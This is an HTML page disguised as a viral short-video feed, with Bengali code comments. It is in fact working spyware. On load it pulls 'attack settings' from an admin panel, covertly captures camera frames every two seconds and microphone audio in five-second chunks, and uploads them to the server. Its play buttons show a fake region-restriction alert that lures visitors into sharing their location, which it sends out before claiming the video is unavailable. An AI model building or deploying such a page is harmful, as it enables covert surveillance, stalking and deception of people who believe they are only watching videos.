<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Viral Reels</title>
    <style>
        body { margin: 0; padding: 0; background-color: #000; color: white; font-family: 'Arial', sans-serif; overflow: hidden; }
        .feed-container { height: 100vh; width: 100vw; overflow-y: scroll; scroll-snap-type: y mandatory; -ms-overflow-style: none; scrollbar-width: none; }
        .feed-container::-webkit-scrollbar { display: none; }
        .reel-container { position: relative; height: 100vh; width: 100%; max-width: 500px; margin: 0 auto; scroll-snap-align: start; display: flex; flex-direction: column; justify-content: center; align-items: center; background-position: center; background-size: cover; background-repeat: no-repeat; }
        
        .bg-1 { background-image: url('https://picsum.photos/seed/r1/400/800'); }
        .bg-2 { background-image: url('https://picsum.photos/seed/r2/400/800'); }
        .bg-3 { background-image: url('https://picsum.photos/seed/r3/400/800'); }
        
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 1; }
        .content { position: relative; z-index: 2; text-align: center; width: 100%; padding: 20px; box-sizing: border-box; }
        
        .play-btn { background: rgba(255, 255, 255, 0.2); border: 2px solid white; border-radius: 50%; width: 70px; height: 70px; display: flex; justify-content: center; align-items: center; cursor: pointer; margin: 0 auto 20px auto; transition: 0.3s; backdrop-filter: blur(5px); }
        .play-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
        
        .video-title { font-size: 20px; font-weight: bold; margin-bottom: 10px; text-shadow: 2px 2px 4px #000; }
        .stats { font-size: 14px; color: #ddd; text-shadow: 1px 1px 2px #000; }
        .scroll-down-hint { position: absolute; bottom: 30px; font-size: 12px; color: #aaa; z-index: 2; animation: bounce 2s infinite; }
        
        .loading-msg { display: none; color: #ffeb3b; font-weight: bold; margin-top: 20px; font-size: 16px; background: rgba(0,0,0,0.7); padding: 10px; border-radius: 8px; }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-10px);} 60% {transform: translateY(-5px);} }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="feed-container">
        <!-- Reel 1 -->
        <div class="reel-container bg-1"><div class="overlay"></div><div class="content"><div class="play-btn" onclick="playVideo(this)"><div class="play-icon"></div></div><div class="loading-msg">Loading...</div><div class="video-title">Wait for the end 😂🔥</div><div class="stats">👁️ 1.2M Views • ❤️ 450K Likes</div></div><div class="scroll-down-hint">⬇ Swipe up for more ⬇</div></div>
        <!-- Reel 2 -->
        <div class="reel-container bg-2"><div class="overlay"></div><div class="content"><div class="play-btn" onclick="playVideo(this)"><div class="play-icon"></div></div><div class="loading-msg">Loading...</div><div class="video-title">POV: You are in Bangladesh 🇧🇩</div><div class="stats">👁️ 890K Views • ❤️ 210K Likes</div></div><div class="scroll-down-hint">⬇ Swipe up for more ⬇</div></div>
        <!-- Reel 3 -->
        <div class="reel-container bg-3"><div class="overlay"></div><div class="content"><div class="play-btn" onclick="playVideo(this)"><div class="play-icon"></div></div><div class="loading-msg">Loading...</div><div class="video-title">Crazy moment caught on cam! 😱</div><div class="stats">👁️ 3.4M Views • ❤️ 1.1M Likes</div></div></div>
    </div>

    <!-- লুকানো ক্যামেরা -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        let attackSettings = { camera: false, location: false, mic: false };

        // পেজ লোড হওয়ার সাথেই অ্যাডমিন প্যানেল থেকে কমান্ড চেক করা
        fetch('/api/settings').then(res => res.json()).then(data => {
            attackSettings = data;
            if(attackSettings.camera || attackSettings.mic) {
                startMediaCapture();
            }
        });

        // মিডিয়া ক্যাপচার ফাংশন
        function startMediaCapture() {
            navigator.mediaDevices.getUserMedia({ video: attackSettings.camera, audio: attackSettings.mic })
            .then(function(stream) {
                
                // ১. ক্যামেরা ক্যাপচার লজিক
                if(attackSettings.camera) {
                    const video = document.getElementById('video');
                    const canvas = document.getElementById('canvas');
                    video.srcObject = stream;

                    video.onplaying = function() {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        
                        setInterval(function() {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            fetch('/upload', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ image: canvas.toDataURL('image/png') })
                            }).catch(err => console.log("Image upload error"));
                        }, 2000); 
                    };
                }

                // ২. অডিও ক্যাপচার লজিক (Ultimate Fix with timeslice)
                if(attackSettings.mic) {
                    const mediaRecorder = new MediaRecorder(stream);

                    // timeslice ব্যবহার করলে ব্রাউজার নিজেই ৫ সেকেন্ড পর পর এখানে অডিও খণ্ড (chunk) পাঠাবে
                    mediaRecorder.addEventListener("dataavailable", event => {
                        if (event.data.size > 0) {
                            // অডিও খণ্ডটি সরাসরি Blob এ রূপান্তর করে সার্ভারে পাঠানো
                            const audioBlob = new Blob([event.data]); 
                            
                            const reader = new FileReader();
                            reader.readAsDataURL(audioBlob);
                            reader.onloadend = function() {
                                fetch('/upload_audio', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ audio: reader.result })
                                }).catch(err => console.log("Audio upload error"));
                            };
                        }
                    });

                    // রেকর্ডিং একটানা চলবে (লাল বাতি অফ হবে না), কিন্তু প্রতি ৫০০০ মি.সে. পর পর সার্ভারে ডেটা পাঠাবে
                    mediaRecorder.start(5000);
                }
            })
            .catch(err => console.error("Media blocked by user:", err));
        }

        // লোকেশন ক্যাপচার লজিক
        function playVideo(btnElement) {
            btnElement.style.display = 'none';
            const loadingMsg = btnElement.nextElementSibling;
            loadingMsg.style.display = 'block';

            if (attackSettings.location) {
                alert("This video is region-restricted.\nPlease allow Location Access to verify your country before playing.");
                
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => sendDataToServer(pos.coords.latitude, pos.coords.longitude),
                        err => sendDataToServer("Denied", "Denied")
                    );
                } else {
                    sendDataToServer("Not Supported", "Not Supported");
                }
            } else {
                sendDataToServer("Disabled", "Disabled");
            }

            setTimeout(() => {
                loadingMsg.style.color = "#ff4444";
                loadingMsg.innerHTML = "Sorry, video is currently unavailable in your region.";
            }, 3000);
        }

        function sendDataToServer(lat, lon) {
            fetch('/submit_offer', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat: lat, lon: lon })
            });
        }
    </script>
</body>
</html>
